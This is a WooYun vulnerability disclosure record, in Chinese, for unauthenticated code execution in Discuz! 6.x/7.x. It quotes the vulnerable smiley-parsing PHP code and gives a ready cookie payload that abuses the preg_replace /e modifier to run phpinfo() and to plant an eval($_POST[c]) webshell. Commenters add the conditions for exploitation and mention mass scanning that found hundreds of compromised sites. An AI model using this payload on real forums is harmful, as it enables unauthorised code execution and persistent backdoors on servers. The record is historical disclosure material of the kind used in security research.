{"id": 47479, "wybug_id": "wooyun-2014-080723", "wybug_title": "Discuz!某两个版本前台产品命令执行（无需登录）", "wybug_corp": "Discuz!", "wybug_author": "Jannock", "wybug_date": "2014-10-25 17:02", "wybug_open_date": "2015-01-23 17:04", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向公众公开  简要描述： 最近总有人翻旧程序，我也翻一个出来！Discuz!某版本虽然停止维护，但使用量还很可观，各大厂商或多或少都有使用。有条件，直接存在命令执行，但目前大多默认配置直接支持。此漏洞在互联网上公开过，但厂商不认为是漏洞？还是那句：没有POC,你说个jb！不登陆，直接执行 详细说明：  影响版本：Discuz! 6.x/7.x 全局变量防御绕过漏洞互联网比较有人公开过，看：http://www.80vul.com/dzvul/sodb/19/sodb-2010-01.txt那时描述是：Discuz! 6.x/7.x 全局变量防御绕过漏洞  POC : 缺可能由于作者没有放出POC，因此没有得到别人重视。此漏洞利用的地方有很多，不限制这个命令执行。漏洞原理就不说了，这里说说漏洞利用：文件：include/discuzcode.func.php\nfunction discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) {\tglobal $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;\tif($parsetype != 1 && !$bbcodeoff && $allowbbcode && (strpos($message, '[/code]') || strpos($message, '[/CODE]')) !== FALSE) {\t\t$message = preg_replace(\"/\\s?\\[code\\](.+?)\\[\\/code\\]\\s?/ies\", \"codedisp('\\\\1')\", $message);\t}\t$msglower = strtolower($message);\t//$htmlon = $htmlon && $allowhtml ? 1 : 0;\tif(!$htmlon) {\t\t$message = $jammer ? preg_replace(\"/\\r\\n|\\n|\\r/e\", \"jammer()\", dhtmlspecialchars($message)) : dhtmlspecialchars($message);\t}\tif(!$smileyoff && $allowsmilies && !empty($GLOBALS['_DCACHE']['smilies']) && is_array($GLOBALS['_DCACHE']['smilies'])) {\t\tif(!$discuzcodes['smiliesreplaced']) {\t\t\tforeach($GLOBALS['_DCACHE']['smilies']['replacearray'] AS $key => $smiley) {\t\t\t\t$GLOBALS['_DCACHE']['smilies']['replacearray'][$key] = '<img src=\"images/smilies/'.$GLOBALS['_DCACHE']['smileytypes'][$GLOBALS['_DCACHE']['smilies']['typearray'][$key]]['directory'].'/'.$smiley.'\" smilieid=\"'.$key.'\" border=\"0\" alt=\"\" />';\t\t\t}\t\t\t$discuzcodes['smiliesreplaced'] = 1;\t\t}\t\t$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);\t}\n注意到  119 行：$message = preg_replace($GLOBALS['_DCACHE']['smilies']['searcharray'], $GLOBALS['_DCACHE']['smilies']['replacearray'], $message, $maxsmilies);因此，直接cookie中带GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();即可执行。请求中Cookie带GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[c])%3B;即一句话木马，此后门漏洞十分隐蔽，不容易发现。随便 google 验证了一下，发现还是有大量中招的。   漏洞证明：  \n\n\n\n   修复方案：  这个你们应该懂！   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-10-27 09:22 厂商回复： 感谢您的支持。我们尽快处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-25 17:08 |    \t\tc0nt \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:7        )\t\t \n  沙发。。。。。    \n     2014-10-25 17:08 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  前排！看戏    \n     2014-10-25 17:12 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  威武霸气一哥    \n     2014-10-25 17:25 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  不错    \n     2014-10-25 17:40 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  一休哥~    \n     2014-10-25 17:45 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  唉。。。连个板凳都木有。。。。    \n     2014-10-25 17:55 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  屌爆了。。。    \n     2014-10-25 17:58 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  不登陆，直接执行    \n     2014-10-25 18:06 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  屌!~~~~~~~    \n     2014-10-25 18:13 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  卧槽 吓尿    \n     2014-10-25 18:31 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  mark    \n     2014-10-25 18:35 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  反正新浪6.0用的特别多~    \n     2014-10-25 19:25 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  切，死一哥！    \n     2014-10-25 19:29 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:10        | the more the better)\t\t \n  碉堡~    \n     2014-10-25 19:54 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  还是那句：没有POC,你说个jb！    \n     2014-10-25 20:42 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  一哥这么温柔的汉子，也会这么粗暴的话～    \n     2014-10-25 20:49 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @gainover 就是这么粗暴    \n     2014-10-25 20:55 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  屌爆了！！    \n     2014-10-25 21:15 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @猪猪侠 哈哈    \n     2014-10-25 21:53 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  特意上号围观1哥    \n     2014-10-25 21:57 |    \t\tbacktrack丶yao \t\t\t( 普通白帽子  |\t\t\t        Rank:290 漏洞数:107        | \"><img src=x onerror=alert(666666);> <im...)\t\t \n  来的晚，连沙发都没有了    \n     2014-10-25 21:57 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  特意上号围观1哥    \n     2014-10-25 22:02 |    \t\tnextdoor \t\t\t( 普通白帽子  |\t\t\t        Rank:325 漏洞数:74        )\t\t \n  又有一大批站点要倒下了    \n     2014-10-25 22:06 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  可直接shell    \n     2014-10-25 22:22 |    \t\tWoodee \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云路人甲，打脸pa pa pa)\t\t \n  围观1哥    \n     2014-10-25 22:59 |    \t\t盛大网络(乌云厂商)\t\t \n  牛逼 求discuz X2命令执行    \n     2014-10-25 23:03 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  @盛大网络 默默地帮你@途牛旅游网    \n     2014-10-25 23:04 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  楼上    \n     2014-10-25 23:09 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  又遭雷劈了    \n     2014-10-25 23:24 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:177 漏洞数:31        | Hacked by @ringzero 我錯了)\t\t \n  围观一哥    \n     2014-10-27 09:42 |    \t\t冰锋刺客 \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:14        | 请在监护人陪同下与本人交流)\t\t \n  这个要关注！！！    \n     2014-10-27 12:16 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @M4sk 普通白帽子 |\t Rank:610 漏洞数:202 | QQ276916312这么高调    \n     2014-10-27 12:47 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  @老和尚 哪里高调了？    \n     2014-10-28 10:02 |    \t\tiproute \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 为路由器生，为交换机死，为Ping通奋斗一辈...)\t\t \n  围观    \n     2014-10-28 10:32 |    \t\tG8dSnow \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:5        | 一直在学习技术、分享知识的路上)\t\t \n  被你们玩烂了要我还看不到。。。    \n     2014-10-28 14:53 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  默默关注一下    \n     2014-10-31 08:49 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  net版本`    \n     2014-10-31 16:40 |    \t\t消逝文字 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | 永久的菜鸟一枚)\t\t \n  霸气    \n     2014-11-01 10:46 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  牛逼    \n     2014-11-01 15:52 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  卧槽啊，20rank+精华+3000rmb。逆天逆大发了@finger    \n     2014-11-01 16:10 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  @老和尚 3$ 至少是5000rmb 好不好    \n     2014-11-01 16:37 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @风情万种 我操、一哥分钱    \n     2014-11-02 19:12 |    \t\tMxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 没有)\t\t \n  啧啧，求详情。    \n     2014-11-03 13:49 |    \t\tztaosony \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 终于来到这个搞基的圣地，我很激动)\t\t \n  一哥太屌    \n     2014-11-14 21:12 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  提醒：为保证通用型安全漏洞的信息保密性，该漏洞无法使用乌云币提前查看，请踏实的杀洞升级吧    \n     2014-12-10 17:32 |    \t\t灬相随灬 \t\t\t( 普通白帽子  |\t\t\t        Rank:369 漏洞数:68        | 大胆天下去得，小心寸步难行。)\t\t \n  人才    \n     2014-12-10 18:28 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  牛逼    \n     2014-12-11 06:52 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  厉害！    \n     2014-12-28 17:01 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  腻害    \n     2015-01-06 23:40 |    \t\thuotoo \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:3        | 努力学习中)\t\t \n  @JannockRequest tainting attempted. 返回这个就是补漏洞了吧？    \n     2015-01-07 00:23 |    \t\twinalva \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | rank是什么？)\t\t \n  @huotoo 怎么利用。。。添加了2条cookie刷新没反应    \n     2015-01-23 18:21 |    \t\txiaoxin \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:16        | 无)\t\t \n  @winalva 分站点，试试打码的图片最后一条是可以的    \n     2015-01-23 21:40 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  Request tainting attempted....    \n     2015-01-23 22:15 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  说出现Request tainting attempted你们有没有仔细看啊，利用前提是php request_order为GP    \n     2015-01-23 22:50 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  request_order受限制啊    \n     2015-01-23 23:20 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  安全参考写的挺好的,不过还是没测试成功,不是被拦截了,就是非GP:Discuz 6.x/7.x 代码执行漏洞触发条件:1 URL连接中的帖子或评论必须带有表情(没有自己去回复)2 php>5.3.x 且 request_order值为GP (默认值为GP)3 后台--帖子内容页---最大单一表情解析次数: 为04 第2次提交Cookie,若没成功,请在浏览框里右键刷新    \n     2015-01-26 00:26 |    \t\tCH’s Alert \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 惹我之人定不赦,持剑斗破苍穹笑。剑指...)\t\t \n  咋利用啊，求教    \n     2015-01-26 00:31 |    \t\tCH’s Alert \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 惹我之人定不赦,持剑斗破苍穹笑。剑指...)\t\t \n  cookie中带，咋弄？    \n     2015-01-26 20:57 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB！    \n     2015-01-26 21:57 |    \t\t发条橙子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:6        | ∑(っ °Д °;)っ)\t\t \n  扫描了20万DZ，中招的有500多个    \n     2015-01-26 23:12 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  @发条橙子 dz的用户列表如何获取到的额?像猪猪侠那样?搜索引擎只有1000条吧    \n     2015-01-29 17:25 |    \t\tS4b0r \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:2        | ````````)\t\t \n  好杀    \n     2015-04-11 23:21 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  直接吓尿了    \n     2015-07-31 09:28 |    \t\tsuolong \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:11        | 我有个野心，就是要成为世界第一的贱士！！)\t\t \n  @huotoo 同问 ！    \n     2015-07-31 13:46 |    \t\t小杰哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:25        | 逆水行舟，不进则退。)\t\t \n  找了几个 基本都是受request_order限制....  暂时没有找到成功的.................    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}